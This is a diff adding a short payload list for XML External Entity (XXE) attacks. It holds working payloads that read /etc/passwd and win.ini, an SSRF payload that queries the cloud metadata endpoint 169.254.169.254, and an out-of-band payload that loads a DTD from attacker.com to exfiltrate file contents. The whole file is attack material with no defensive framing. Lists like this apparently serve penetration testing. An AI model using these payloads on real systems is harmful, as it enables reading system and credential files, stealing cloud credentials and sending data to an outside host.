@@ -1,0 +1,31 @@
+# XML External Entity (XXE) Payloads
+
+# Basic Local File Read (Unix)
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<foo>&xxe;</foo>
+
+# Basic Local File Read (Windows)
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini" >]>
+<foo>&xxe;</foo>
+
+# SSRF via XXE
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/" >]>
+<foo>&xxe;</foo>
+
+# Out of Band (OOB) / Exfiltration
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+  %eval;
+  %exfiltrate;
+]>
+<foo>&exfiltrate;</foo>
